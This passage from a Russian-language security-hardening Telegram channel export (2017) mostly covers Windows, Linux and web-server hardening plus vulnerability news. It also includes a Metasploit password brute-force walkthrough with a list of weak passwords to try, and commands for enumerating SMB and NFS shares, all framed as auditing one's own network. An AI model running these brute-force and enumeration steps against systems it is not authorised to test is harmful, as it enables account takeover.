Вернемся к нашим SUID/SGID файлам. Для нетехнарей напоминаю, это файлы, которые выполняются с правами владельца-пользователя или владельца-группы независимо от того, кто их запустил.<br><br>Вот они:<br><br><code>df --local -P | awk {&quot;if (NR!=1) print \$6&quot;} | xargs -I &quot;{}&quot; find &quot;{}&quot; -xdev -type f -perm -4000 -ls</code><br><code>df --local -P | awk {&quot;if (NR!=1) print \$6&quot;} | xargs -I &quot;{}&quot; find &quot;{}&quot; -xdev -type f -perm -2000 -ls</code><br><br>1. Если среди них каким-то образом затесался netcat (nc), то это полный ахтунг. Без каких-либо телодвижений взломщик получает доступ к башу с правами рута, ну или кому там у вас принадлежит этот файл. Убираем лишние права:<br><br><code>chmod u-s /bin/nc</code><br><code>chmod g-s /bin/nc</code><br><br>Ну и неплохо бы разобраться, откуда они взялись.<br><br>2. Не менее плохо, если на SUID/SGID есть права записи у кого-либо, кроме владельца. Внимательно смотрим вывод поиска файлов. Если такие файлы есть - их стоит исследовать на предмет вредоносного кода или хотя бы удалить и переустановить. Появление лишних прав на запись на SUID/SGID файлы - инцидент безопасности и может свидетельствовать о взломе системы. Но может быть и просто ошибкой, вот только опасной.
       </div>

      </div>

     </div>

     <div class="message service" id="message-37">

      <div class="body details">
30 October 2017
      </div>

     </div>

     <div class="message default clearfix" id="message44">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="30.10.2017 11:08:07">
11:08
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Есть такая атака - SMB Relay. Подробно о ее реализации можно почитать вот здесь <a href="http://devteev.blogspot.ru/2013/06/137.html/">http://devteev.blogspot.ru/2013/06/137.html/</a> Вкратце - атакующий вклинивается в процесс аутентификации и перенаправляет ответы легитимного клиента на атакуемый сервер, чтобы самому получить к нему доступ. Чтобы защититься, нужно включить SMB Signing.<br><br><strong>Защищаемся:</strong><br><br>Включаем политики <br>Computer Configuration\Windows Settings\Security Settings\Local Policies\Security <br>Options\Microsoft network server:Digitally sign communications (always) и <br>Computer Configuration\Windows Settings\Security Settings\Local Policies\Security <br>Options\Microsoft network client: Digitally sign communications (if server agrees)<br><br>Для серверов Samba: добавляем опцию «client signing=mandatory» в файле smb.conf
       </div>

      </div>

     </div>

     <div class="message service" id="message-38">

      <div class="body details">
31 October 2017
      </div>

     </div>

     <div class="message default clearfix" id="message45">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="31.10.2017 11:14:03">
11:14
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
А вы настроили парольную политику в домене? Если у вас крупная компания и есть отдел ИБ, то они точно этого не упустили. А вот если нет, то ваша жизнь полна безоблачного копания с системами, однако про парольную политику вы могли забыть.<br><br>Тут есть два момента. Первый - полностью исключается возможность онлайн-брута учеток в домене. А брутить учетки по SMB довольно приятно и продуктивно. Второй - если к хакеру попали ваши хеши, у него совсем немного времени подобрать пароли, пока они актуальны.<br><br><strong>Настраиваем групповые политики домена:</strong><br><br>Computer Configuration\Windows Settings\Security Settings\Account Policies\Account <br>Lockout Policy\Account lockout threshold ставим 5<br><br>Computer Configuration\Windows Settings\Security Settings\Account Policies\Account <br>Lockout Policy\Account lockout duration ставим 30<br><br>Computer Configuration\Windows Settings\Security Settings\Account Policies\Account <br>Lockout Policy\Reset account lockout counter after ставим 30<br><br>Computer Configuration\Windows Settings\Security Settings\Account Policies\Password <br>Policy\Minimum password length ставим 8, все рекомендуют, но лучше 9, хеши паролей из 8 символов брутятся за разумное время, а вот из 9 - нет<br><br>Computer Configuration\Windows Settings\Security Settings\Account Policies\Password <br>Policy\Enforce password history ставим 5<br><br>Computer Configuration\Windows Settings\Security Settings\Account Policies\Password <br>Policy\Password must meet complexity requirements ставим &quot;Включено&quot;<br><br>Computer Configuration\Windows Settings\Security Settings\Account Policies\Password <br>Policy\Store passwords using reversible encryption ставим &quot;Выключено&quot;<br><br>Computer Configuration\Windows Settings\Security Settings\Account Policies\Password <br>Policy\Minimum password age ставим 1 или 2<br><br>Computer Configuration\Windows Settings\Security Settings\Account Policies\Password <br>Policy\Maximum password age ставим 90
       </div>

      </div>

     </div>

     <div class="message service" id="message-39">

      <div class="body details">
1 November 2017
      </div>

     </div>

     <div class="message default clearfix" id="message46">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="01.11.2017 11:02:02">
11:02
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Тут на днях Oracle новую критическую уязвимость анонсировала, CVE-2017-10151. Уязвимость наблюдается в продуктах Oracle Identity Manager версий <a href="11.1.1.7">11.1.1.7</a>, <a href="11.1.1.9">11.1.1.9</a>, 11.1.2.1.0, 11.1.2.2.0, 11.1.2.3.0 и 12.2.1.3.0 и позволяет удаленному неавторизованному аттакеру получить полный доступ к системе. В общем, CVSS ей дали 10. Причем в более старых версиях продукта уязвимость, скорей всего, тоже есть, но Oracle их не поддерживает, так что и проверять, и патч выпускать не будет.<br><br>Ну а для поддерживаемых версий патч где-то тут <a href="https://support.oracle.com/rs?type=doc&amp;id=2322316.1">https://support.oracle.com/rs?type=doc&amp;id=2322316.1</a>.<br><br>Oracle Identity Manager - это такая штука для внедрения правил корпоративной политики обращения с корпоративными ресурсами для пользователей, поддерживаемых как внутри сети, так и при удаленных подключениях.
       </div>

      </div>

     </div>

     <div class="message service" id="message-40">

      <div class="body details">
2 November 2017
      </div>

     </div>

     <div class="message default clearfix" id="message47">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="02.11.2017 11:15:28">
11:15
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Apple наконец выпустила патчи, закрывающие KRACK. Это версии 10.3.1 для MacOS, 11.1 для iOS и 4.1 для WatchOS. Обновляемся и пользуемся вайфаем спокойно. Также апдейты закрывают многие другие минорные баги.
       </div>

      </div>

     </div>

     <div class="message service" id="message-41">

      <div class="body details">
3 November 2017
      </div>

     </div>

     <div class="message default clearfix" id="message48">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="03.11.2017 11:43:44">
11:43
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Сегодня пятница, а значит, время веселиться. Поэтому будем брутить учетки собственных пользователей. Зачем? Чтобы узнать, не используют ли они простые пароли.<br><br>Сначала получаем список всех пользователей:<br><br><code>net user /domain</code><br><br>И сохраняем в файле в столбик. Пусть файл называется users.<br><br>Переносим файл на Kali и запускаем metasploit:<br><br><code>msfconsole</code><br><code>use auxiliary/scanner/smb/smb_login</code><br><code>set RHOSTS &lt;IP контроллера домена&gt;</code><br><code>set SMBDomain &lt;Имя домена&gt;</code><br><code>set USER_FILE users</code><br><code>set PASS_FILE passes</code><br><code>set MaxGuessesPerUser 3</code><br><br>Брутить будем по три пароля с перерывом 30 минут, чтобы не залочить учетки. Пароли, которые стоит проверить:<br><strong>Qwerty12</strong><br><strong>Qwerty123</strong><br><strong>Qwerty2017</strong><br><strong>1qaz@WSX</strong><br><strong>!QAZ2wsx</strong><br><strong>123qweASD</strong><br><strong>Pa$$w0rd</strong><br><strong>1q2w#E$R</strong><br><strong>&lt;Ваш пароль по умолчанию для юзеров&gt;</strong><br><strong>&lt;Название компании&gt;1</strong><br><strong>&lt;Название компании&gt;12</strong><br><strong>&lt;Название компании&gt;123</strong><br><strong>&lt;Название компании&gt;2017</strong><br><strong>Jctym2017</strong><br><strong>Autumn2017</strong><br><br>Сохраняем первую партию паролей в файл passes и запускаем брут:<br><br><code>run</code><br><br>Когда брут закончится, можно скопировать все из консоли в файлик (допустим, result) и сделать:<br><br><code>grep + result</code><br><br>Ну и смотрим, есть ли простые пароли. Через полчаса загружаем следующую партию паролей в passes, запускаем, ну и так далее, пока не надоест. Хороших вам выходных!
       </div>

      </div>

     </div>

     <div class="message service" id="message-42">

      <div class="body details">
7 November 2017
      </div>

     </div>

     <div class="message default clearfix" id="message49">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="07.11.2017 11:10:16">
11:10
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
За пользователями Android охотится новый троян DoubleLocker. Программулина притворяется Adobe Flash Player. К счастью, скачать ее в Google Play Store нельзя. Поэтому просто будьте осторожны при загрузке приложений со сторонних ресурсов, сейчас, да и всегда.<br><br>Зато в Google Play Market можно скачать несколько фейковых вариантов WhatsApp, а вот оригинал там уже недоступен, так что поиску вам выдадут только фейки. Кстати их установили уже более 1 миллиона раз.
       </div>

      </div>

     </div>

     <div class="message service" id="message-43">

      <div class="body details">
8 November 2017
      </div>

     </div>

     <div class="message default clearfix" id="message50">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="08.11.2017 11:18:44">
11:18
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Оказывается, в Torе есть бага, на днях нашли, которая позволяет узнать настоящий IP-адрес пользователя. Вот анонимность то! Если быть точнее, бага в Firefoxе, на котором Tor основан, но для пользователей фаерфокса такого веселья она не приносит. Уязвимы версии Tor для MacOS и Linux, им нужно обновиться до версии 7.0.9, чтобы устранить багу, а вот виндусятники могут быть спокойны.
       </div>

      </div>

     </div>

     <div class="message service" id="message-44">

      <div class="body details">
9 November 2017
      </div>

     </div>

     <div class="message default clearfix" id="message51">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="09.11.2017 12:41:29">
12:41
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<strong>Как обезопасить протоколы Lan Manager?</strong><br><br>В случае аутентификации по протоколам LM/NTLMv1 происходит следующее:  <br>  1. Клиент посылает серверу запрос на аутентификацию.<br>  2. Сервер отвечает пакетом, в котором указывается выбранная NTLM аутентификация и поле EncryptionKey которого содержит 64-битный случайный запрос (challenge).<br>  3. Клиент посылает сообщение, содержащее поля AccountName (учетная запись), PrimaryDomain (домен учетной записи), CaseInsensitivePassword (пароль не чувствительный к регистру, фактически это LM-ответ) и CaseSensitivePassword (пароль чувствительный к реестру, фактически NT-ответ). Оба ответа являются 192-битными и вычисляются на основе NT и LM ключа по одному и тому же алгоритму. Если соответствующего ключа нет, то и соответствующий ответ будет нулевым.<br>Проблема здесь в том, что LM- и NTLM-ответы разбиваются на три части, которые обрабатываются отдельно. Соответственно и брутиться могут отдельно.<br><br>В NTLMv2 также используется взаимная аутентификация клиента и сервера, но для получения ответа используется гораздо более сильный алгоритм HMAC-MD5. Ответ вычисляется следующим образом:<br>  1. Клиент генерирует ключ (NT2 ключ) используя HMAC_MD5 с NT-ключем в качестве ключа и именем пользователя конкатенированным с именем домена в Unicode в качестве текста.<br>  2. Клиент генерирует кусок данных (blob), в который входят случайные данные, временная метка, NetBIOS имя и т.д, всего порядка 64 байт, длина может варьироваться.<br>  3. blob конкатенируется с ответом сервера<br>  4. Вычисляется HMAC-MD5 c NT2 ключем полученном на первом шаге в качестве ключа и blob в качестве текста.<br>  5. Результат (4) конкатенируется с blob (2). То, что получилось и есть ответ.<br>Такой алгоритм генерации ответа делает NTLMv2 гораздо более устойчивым к атакам перебора, тем не менее, остается возможность подбора слабых паролей по словарю.<br><br><strong>Так что отключаем LM и NTLMv1:</strong><br><br>Включаем групповую политику Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options\Network security: LAN Manager authentication level ... и выбираем Send NTLMv2 response only. Refuse LM &amp; NTLM
       </div>

      </div>

     </div>

     <div class="message service" id="message-45">

      <div class="body details">
10 November 2017
      </div>

     </div>

     <div class="message default clearfix" id="message52">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="10.11.2017 12:23:03">
12:23
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Чтобы полностью избавиться от NTLMv1 и LM нужно применить еще несколько политик.<br><br>1. Отключаем NTLMv1 для RPC-запросов<br>Идем в политику Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options\Network security: Minimum session security for NTLM SSP based …, открываем и включаем опцию Require NTLMv2 session security. Заодно можно потребовать 128-битное шифрование, полезно, эксперты по безопасности советуют.<br><br>2. Защита RDP от использования NTLMv1<br>В реестре по пути HKLM\Software\Microsoft\Windows NT\CurrentVersion\TerminalServerGateway\Config\Core ставим параметр EnforceChannelBinding (DWORD32) в единицу.<br><br>3. Защита PPTP/L2TP/SSTP от использования NTLMv1<br>Настраиваем везде использование MS-CHAPv2, остальные протоколы аутентификации не нужны, без них все прекрасно будет работать.<br><br>4. Отключаем хранение LM-хешей.<br>Включаем политику Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options\Network security: Do not store LAN manager hash value on next password change
       </div>

      </div>

     </div>

     <div class="message service" id="message-46">

      <div class="body details">
13 November 2017
      </div>

     </div>

     <div class="message default clearfix" id="message53">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="13.11.2017 10:51:35">
10:51
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
За последний месяц в Android и его компонентах нашли целых 31 уязвимость!<br><br>Из них 9 с критическим уровнем риска: CVE-2017-0832, CVE-2017-0833, CVE-2017-0834, CVE-2017-0835, CVE-2017-0836, CVE-2017-0841, CVE-2017-11013, CVE-2017-11015, CVE-2017-11014. Они все позволяют совершить удаленное выполнение произвольного кода.<br><br>И 22 с высоким уровнем риска: CVE-2017-0830, CVE-2017-0831, CVE-2017-0839, CVE-2017-0840, CVE-2017-0842, CVE-2017-9077, CVE-2017-7541, CVE-2017-0843, CVE-2017-6264, CVE-2017-11092, CVE-2017-9690, CVE-2017-11017, CVE-2017-11028, CVE-2017-13077, CVE-2017-13078, CVE-2017-13079, CVE-2017-13080, CVE-2017-13081, CVE-2017-13082, CVE-2017-13086, CVE-2017-13087, CVE-2017-13088. В основном, они ведут к повышению привилегий.<br><br>Пропатченные версии Android: 5.0.2, 5.1.1, 6.0, 6.0.1, 7.0, 7.1.1, 7.1.2, 8.0.
       </div>

      </div>

     </div>

     <div class="message service" id="message-47">

      <div class="body details">
14 November 2017
      </div>

     </div>

     <div class="message default clearfix" id="message54">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="14.11.2017 12:02:26">
12:02
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
SSLv2 подвержен атакам DROWN, POODLE и FREAK. SSLv3 подвержен атаке POODLE. TLSv1 с использованием шифров в режиме CBC подвержен атаке POODLE. Эти версии протокола SSL/TLS признаны слабыми и не рекомендуются к использованию. Мажорные браузеры уже не открывают сайты, защищенные протоколами SSLv2 и SSLv3.<br><br><strong>Отключаем SSlv2, SSLv3 и TLSv1 в Apache:</strong><br><br>Протоколы SSL/TLS настраиваются с помощью директивы SSLProtocol. Первым делом нужно отключить то, что было настроено раньше, используем PowerShell с правами администратора:<br><br><code>$sr = &lt;путь к ServerRoot апача&gt;</code><br><code>$main_config = &quot;$sr\conf\httpd.conf&quot;</code><br><code>$text = Get-Content -Raw $main_config</code><br><code>$text = $text -Replace &quot;((\n|\r\n)\s*SSLProtocol .*?\n)&quot;, &quot;## `$1&quot;</code><br><code>$text | Set-Content -Path $main_config</code><br><code>foreach ($a in findstr /i ^Include $main_config) { </code><br><code>          $file = $a.Split(&apos; &apos;)[1].replace(&apos;/&apos;,&apos;\&apos;).replace(&apos;&quot;&apos;,&apos;&apos;); </code><br><code>          $text = get-Content -Raw $file;</code><br><code>          $text = $text -Replace &quot;((\n|\r\n)\s*SSLProtocol .*?\n)&quot;, &quot;## `$1&quot;;</code><br><code>          $text | Set-Content -Path $file; }</code><br><br>Далее добавляем директиву <code>SSLProtocol TLSv1.1 TLSv1.2</code> на уровне сервера и в каждом виртуальном хосте, где требуется SSL/TLS. Найти все виртуальные хосты можно так:<br><br><code>Select-String &quot;&lt;VirtualHost&quot; $main_config</code><br><code>foreach ($a in findstr /i ^Include $main_config) { </code><br><code>          $file = $a.Split(&apos; &apos;)[1].replace(&apos;/&apos;,&apos;\&apos;).replace(&apos;&quot;&apos;,&apos;&apos;); </code><br><code>          Select-String &quot;&lt;VirtualHost&quot;  $file; }</code>
       </div>

      </div>

     </div>

     <div class="message service" id="message-48">

      <div class="body details">
15 November 2017
      </div>

     </div>

     <div class="message default clearfix" id="message55">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="15.11.2017 10:56:29">
10:56
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Продолжаем.<br><br><strong>Отключаем SSLv2, SSLv3 и TLSv1 в Apache на Linux:</strong><br><br><code>sr=&lt;путь к ServerRoot апача&gt;</code><br><code>main_config = &quot;$sr/conf/httpd.conf&quot;</code><br><code>ap_cf=</code><br><code>for e in `grep -i ^Include $main_config`</code> <code>; do ap_cf=$ap_cf\ `</code> <code>echo $e | grep -i -v Include`</code> <code>; done</code><br><code>ap_cf=$main_config\ $ap_cf</code><br><code>read -ra apache_cfg_files &lt;&lt;&lt; &quot;$ap_cf&quot;</code><br><code>for f in &quot;${apache_cfg_files[@]}&quot;; do sed -i &apos;s;\(^\s*SSLProtocol \);##\1;g&apos; $f; done</code><br><br>Далее добавляем директиву <code>SSLProtocol TLSv1.1 TLSv1.2</code> на уровне сервера и в каждом виртуальном хосте, где требуется SSL/TLS. Найти все виртуальные хосты можно так:<br><br><code>egrep -in &quot;^\s*&lt;VirtualHost&quot; $ap_cf</code><br><br><strong>Отключаем SSLv2, SSLv3 и TLSv1 в Tomcat на Linux:</strong><br><br>В Tomcat SSL/TLS-протоколы настраиваются с помощью атрибута protocols (алиас sslEnabledProtocols) элемента Connector в главном server.xml. Поэтому ищем все коннекторы:<br><br><code>egrep -in &quot;^\s*&lt;Connector&quot; &lt;Catalina_home&gt;/conf/server.xml</code><br><br>И добавляем (или заменяем) атрибут <code>sslEnabledProtocols=&quot;TLSv1.2+TLSv1.1&quot;</code> в тех коннекторах, для которых требуется защищенное соединение.<br><br><strong>Отключаем SSLv2, SSLv3 и TLSv1 в Tomcat на Windows:</strong><br><br>Все так же, как на Linux. Только коннекторы ищем так (PowerShell):<br><br><code>Select-String &quot;^\s*&lt;Connector&quot; &lt;Catalina_home&gt;\conf\server.xml</code><br><br>Потом для секурных устанавливаем атрибут <code>sslEnabledProtocols=&quot;TLSv1.2+TLSv1.1&quot;</code>.
       </div>

      </div>

     </div>

     <div class="message service" id="message-49">

      <div class="body details">
16 November 2017
      </div>

     </div>

     <div class="message default clearfix" id="message56">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="16.11.2017 12:41:13">
12:41
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Продолжаем.<br><br><strong>Отключаем SSLv2, SSLv3 и TLSv1 в Nginx:</strong><br><br>Добавляем (или изменяем) директиву <code>ssl_protocols       TLSv1.1 TLSv1.2;</code> в блоках &quot;server&quot; и/или &quot;http&quot;, где включен SSL/TLS.<br><br><strong>Отключаем SSLv2 и SSLv3 в IIS:</strong><br><br>Здесь мы не будем отключать TLSv1.0, потому что он необходим для некоторых продуктов Microsoft, в частности RDP.<br><br><code>reg add &quot;HKLM\System\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\SSL 2.0\Server&quot; /v Enabled /t REG_DWORD /d 0 /f</code><br><code>reg add &quot;HKLM\System\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\SSL 2.0\Server&quot; /v DisabledByDefault /t REG_DWORD /d 1 /f</code><br><code>reg add &quot;HKLM\System\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\SSL 3.0\Server&quot; /v Enabled /t REG_DWORD /d 0 /f</code><br><code>reg add &quot;HKLM\System\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\SSL 3.0\Server&quot; /v DisabledByDefault /t REG_DWORD /d 1 /f</code><br><code>reg add &quot;HKLM\System\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.0\Server&quot; /v Enabled /t REG_DWORD /d 0xFFFFFFFF /f</code><br><code>reg add &quot;HKLM\System\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.0\Server&quot; /v DisabledByDefault /t REG_DWORD /d 0 /f</code><br><code>reg add &quot;HKLM\System\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.1\Server&quot; /v Enabled /t REG_DWORD /d 0xFFFFFFFF /f</code><br><code>reg add &quot;HKLM\System\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.1\Server&quot; /v DisabledByDefault /t REG_DWORD /d 0 /f</code><br><code>reg add &quot;HKLM\System\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.2\Server&quot; /v Enabled /t REG_DWORD /d 0xFFFFFFFF /f</code><br><code>reg add &quot;HKLM\System\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.2\Server&quot; /v DisabledByDefault /t REG_DWORD /d 0 /f</code>
       </div>

      </div>

     </div>

     <div class="message service" id="message-50">

      <div class="body details">
17 November 2017
      </div>

     </div>

     <div class="message default clearfix" id="message57">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="17.11.2017 12:21:12">
12:21
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
В каждой компании есть сетевая папка, где хранится всякий полезный софт. В 90% случаев у доменных пользователей есть к ней доступ на запись. А бывает, что и анонимный доступ, ведь просто софт лежит, ничего секретного! А ведь какой-нибудь неблагородный человек может модифицировать этот софт и добавить туда и майнер, и локер, и кейлоггер, и вообще что угодно.<br><br><strong>Вывод: права на запись на шарах, где хранится софт, надо отключать.</strong><br><br>Чтобы найти все шары, есть полезный модуль в metasploit, заодно узнаете, что там нарасшаривали ваши нерадивые пользователи.<br><br><code>msfconsole</code><br><code>use auxiliary/scanner/smb/smb_enumshares</code><br><code>set RHOSTS &lt;network&gt;</code><br><code>set SMBDomain &lt;domain_name&gt;</code><br><code>set SMBUser &lt;username&gt;</code><br><code>set SMBPass &lt;password&gt;</code><br><code>run</code><br><br>А сетевые папки, подключенные с помощью NFS, можно поискать так:<br><br><code>nmap -p111 --script=nfs-ls -Pn -n -v &lt;IP_addresses&gt;</code><br><code>nmap -p2049 -Pn -n -v &lt;IP_addresses&gt;</code>
       </div>

      </div>

     </div>

     <div class="message service" id="message-51">

      <div class="body details">
20 November 2017
      </div>

     </div>

     <div class="message default clearfix" id="message58">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="20.11.2017 11:48:05">
11:48
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Первый шаг в защите информационной сети - это сегментация. Практически все выделяют ДМЗ, как рекомендуется, серверные сегменты и пользовательские. Самые крутые - делают отдельный VLAN для каждого подразделения в компании, работает супер эффективно! (с точки зрения защиты пользователей)<br><br>Некоторые компании предпочитают не устранять уязвимости, а закрывать сетевой доступ от сегмента, где может быть взломщик, к целевому сегменту. Это нарушает принцип Defense in Depth, но на одном уровне защититься помогает. Часто этого и достаточно. Кроме того, устранение избыточного сетевого доступа защищает и от 0day уязвимостей.<br><br>Основная суть сегментирования, конечно, в установке правил межсетевого экранирования между сегментами. Идеальные правила соответствуют нескольким простым рекомендациям, но написать их бывает совсем непросто. Эти рекомендации:<br>1. В конце цепочки правил должен быть запрет всего остального.<br>2. Должны быть разрешены только необходимые соединения. На практике это значит, что требуется прослушивать легитимный трафик, выявлять адреса и порты, по которым ходят соединения, и запрещать все остальное. Визуально хорошие правила выглядят так: точно указаны конкретные хосты отправления, конкретные хосты назначения и конкретные порты. Если в одной из категорий указан диапазон или &quot;все&quot;, то к такому правилу стоит присмотреться.<br>3. Инспекция должна быть с учетом состояния сессии.<br>4. Стоит включить проверку маршрута к отправителю, это помешает подделке адресов отправления.<br><br>И еще пара замечаний.<br><br>Относительно сегментирования: есть такая фишка как Private VLAN, что позволяет полностью устранить канальный трафик в сегменте. Каждый хост как бы в отдельном влане, хотя с точки зрения конфигурации это один влан. Это позволяет уничтожить возможность канальных атак.<br><br>Относительно межсетевого экранирования: ни в коем случае не прорубайте дырки для отдельных адресов к критической архитектуре! Особенно из гостевой сети. Хакер, будучи в одной с ним сети, без проблем найдет этот адрес, сконфигурирует его себе и получит доступ к вашим драгоценностям.
       </div>

      </div>

     </div>

     <div class="message service" id="message-52">

      <div class="body details">
21 November 2017
      </div>

     </div>

     <div class="message default clearfix" id="message59">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="21.11.2017 11:11:29">
11:11
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
На днях Oracle выпустила экстренное обновление, призванное закрыть 5 уязвимостей в нескольких продуктах, полагающихся на проприетарный протокол Jolt. Уязвимости затрагивают Oracle People Soft Campus Solutions, Human Capital Management, Financial Management и Supply Chain Management, а также другие продукты на базе сервера приложений Tuxedo 2.<br><br><strong>Описание уязвимостей:</strong><br><br>    <strong>CVE-2017-10272</strong> — уязвимость с раскрытием содержимого памяти; эксплуатация позволяет удаленно прочитать память сервера (9,9 балла по шкале CVSS).<br>    <strong>CVE-2017-10267</strong> — уязвимость переполнения стека (7,5 по шкале CVSS).<br>    <strong>CVE-2017-10278</strong> — уязвимость переполнения динамической области памяти (7 по шкале CVSS).<br>    <strong>CVE-2017-10266</strong> — уязвимость, позволяющая получить перебором пароли в компоненте DomainPWD, через который реализована аутентификация по протоколу Jolt (5,3 по шкале CVSS).<br>    <strong>CVE-2017-10269</strong> — уязвимость протокола Jolt, позволяющая злоумышленнику полностью скомпрометировать систему PeopleSoft (10 по шкале CVSS).<br><br>Уязвимость с раскрытием содержимого памяти (CVE-2017-10272) реализуется относительно просто и позволяет злоумышленнику с ограниченными привилегиями и доступом к сети через Jolt скомпрометировать сервер Oracle Tuxedo.<br><br>Для уязвимых продуктов выпущены патчи <a href="http://www.oracle.com/technetwork/security-advisory/alert-cve-2017-10269-4021872.html">http://www.oracle.com/technetwork/security-advisory/alert-cve-2017-10269-4021872.html</a>.
       </div>

      </div>

     </div>

     <div class="message service" id="message-53">

      <div class="body details">
22 November 2017
      </div>

     </div>

     <div class="message default clearfix" id="message60">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="22.11.2017 12:25:46">
12:25
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
При создании пользователя в Linux/UNIX, если не указать UID явно, система проставит минимальный свободный UID из тех, что не выделены для системных учетных записей. А это значит, что если удалить пользователя, его UID освободится и будет назначен при создании новому пользователю. Вот только система идентифицирует пользователя по UID и будет считать нового пользователя тем же самым, что и старый. Таким образом, новый пользователь получит права доступа старого и доступ ко всем его ресурсам.<br><br><strong>Поэтому никогда не удаляйте пользователей в Linux/UNIX!</strong><br><br>Уволенного сотрудника или ненужную больше учетную запись можно заблокировать.<br><br>Чтобы заэкспайрить учетную запись:<br><br><code>chage -E &lt;YYYY-MM-DD&gt; &lt;user&gt;</code><br><br>с датой вот прям сейчас.<br><br>Для пущей надежности можно забрать у пользователя шелл и заблокировать пароль:<br><br><code>usermod -s /bin/false &lt;user&gt;</code><br><code>user:*:16592:0:99999:7:::</code> (заменить хеш пароля на * в /etc/shadow)
       </div>

      </div>

     </div>

     <div class="message service" id="message-54">

      <div class="body details">
23 November 2017
      </div>

     </div>

     <div class="message default clearfix" id="message61">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

